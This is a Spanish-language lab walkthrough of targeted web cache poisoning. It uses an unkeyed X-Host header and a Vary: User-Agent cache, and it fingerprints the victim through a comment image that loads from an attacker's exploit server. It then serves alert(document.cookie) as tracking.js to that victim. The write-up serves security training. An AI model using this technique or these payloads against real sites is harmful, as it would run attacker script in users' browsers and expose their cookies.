# 🧪 Web Cache Poisoning dirigido con cabecera desconocida

## 📄 Descripción del laboratorio

Este laboratorio es vulnerable a **Web Cache Poisoning**, pero con una particularidad importante: el payload solo debe impactar a **un subconjunto específico de usuarios**, en concreto a la víctima prevista.

El sistema de caché almacena diferentes variantes de la misma respuesta dependiendo del **User-Agent** del cliente. Esto significa que la misma URL puede tener múltiples versiones cacheadas.

El objetivo del laboratorio es **envenenar la caché con una respuesta que ejecute `alert(document.cookie)` únicamente en el navegador de la víctima**.



## 📚 Teoría

En este laboratorio se trabaja un caso de **Web Cache Poisoning dirigido**, donde no basta con insertar contenido malicioso en la caché. Es necesario **alinearse con la misma variante de caché que utiliza la víctima**.

### 📌 Puntos clave del escenario

El servidor utiliza una cabecera no documentada llamada:

```http
X-Host
```

Esta cabecera se utiliza para construir URLs de recursos dentro de la respuesta.

Sin embargo:

* La cabecera **no forma parte de la cache key**.
* El valor influye en **cómo se cargan los recursos del sitio**.

Por otro lado, la respuesta del servidor incluye:

```
Vary: User-Agent
```

Esto indica que la caché mantiene **versiones diferentes de la respuesta dependiendo del User-Agent**.

El resultado es que:

* Si envenenamos la caché usando nuestro propio User-Agent
* Solo afectará a usuarios con ese mismo User-Agent

Para impactar a la víctima debemos **identificar su User-Agent y utilizar exactamente el mismo al realizar el poisoning**.

### 📌 El fallo concreto

El ataque se basa en dos elementos:

* `X-Host` permite controlar **desde qué dominio se cargan recursos JavaScript**.
* `Vary: User-Agent` crea **variantes de caché separadas por navegador**.

Si el atacante obtiene el **User-Agent exacto de la víctima**, puede:

1. Envenenar únicamente su variante de caché.
2. Hacer que su navegador cargue JavaScript desde un dominio controlado.

Esto convierte el ataque en un **Web Cache Poisoning dirigido**, silencioso y altamente realista.



## 📝 Práctica

### 1️⃣ Descubrir la cabecera oculta

Interceptamos la petición a la página principal (`/`) y utilizamos **Param Miner** para descubrir cabeceras interesantes.

Procedimiento:

* Click derecho sobre la petición.
* Seleccionar **Guess headers**.
* Revisar los resultados.

Param Miner detecta la cabecera:

```
X-Host
```

<br>
La probamos en **Burp Repeater** y comprobamos que:

* Se refleja en la respuesta.
* Influye en la carga de recursos.
* No forma parte de la **cache key**.

### 2️⃣ Preparar el JavaScript malicioso

Accedemos al **Exploit Server** y creamos el archivo que la aplicación carga como recurso JavaScript.

Ruta:

```
/resources/js/tracking.js
```

Contenido del archivo:

```javascript
alert(document.cookie);
```

<br>
Guardamos el exploit.



### 3️⃣ Probar el poisoning inicial

Enviamos una petición desde **Burp Repeater** con la cabecera:

```http
X-Host: EXPLOIT-SERVER.net
```

Observamos que:

* El servidor intenta cargar el archivo JavaScript desde nuestro dominio.
* La respuesta puede almacenarse en caché.

Sin embargo, todavía no sabemos si afectará a la víctima debido al uso de:

```http
Vary: User-Agent
```



### 4️⃣ Obtener el User-Agent de la víctima

El laboratorio indica que **la víctima verá cualquier comentario que publiquemos**, lo que permite realizar fingerprinting.

Publicamos un comentario que incluya una imagen externa:

```html
<img src="https://EXPLOIT-SERVER.net">
```

<img width="770" height="687" alt="image" src="https://github.com/user-attachments/assets/7feb924c-c6dd-4f7b-bbfb-673ccb3d5415" />
<br>
Cuando la víctima visita los comentarios:

* Su navegador solicita esa URL.
* El **Exploit Server registra la petición**.

En los logs podemos ver:

* El **User-Agent exacto de la víctima**.

<img width="1520" height="31" alt="image" src="https://github.com/user-attachments/assets/66e37e9b-5e55-4d76-8c05-6b47880c04a5" />
<br>
Normalmente será diferente al nuestro (bot, crawler o navegador distinto).



### 5️⃣ Poisoning dirigido

Volvemos a **Burp Repeater** y enviamos la petición maliciosa con:

```http
X-Host: EXPLOIT-SERVER.net
User-Agent: USER-AGENT-DE-LA-VÍCTIMA
```

<img width="1451" height="514" alt="image" src="https://github.com/user-attachments/assets/4476a1dd-8f24-475d-8c31-af5d2f8115af" />
<br>
Esto es crucial porque ahora:

* Coincidimos con **la variante de caché utilizada por la víctima**.
* La respuesta manipulada se almacena en **su slot de caché**.

Al enviar la petición observamos:

```http
X-Cache: hit
```

Esto confirma que la caché ha sido envenenada para esa variante.



### 6️⃣ Ejecución en la víctima

Cuando la víctima vuelve a visitar la página:

* Recibe la **versión cacheada manipulada**.
* Su navegador intenta cargar el recurso:

```
/resources/js/tracking.js
```

desde nuestro **Exploit Server**.

El JavaScript se ejecuta automáticamente:

```javascript
alert(document.cookie);
```

El laboratorio detecta la ejecución del payload en el navegador de la víctima y se completa.
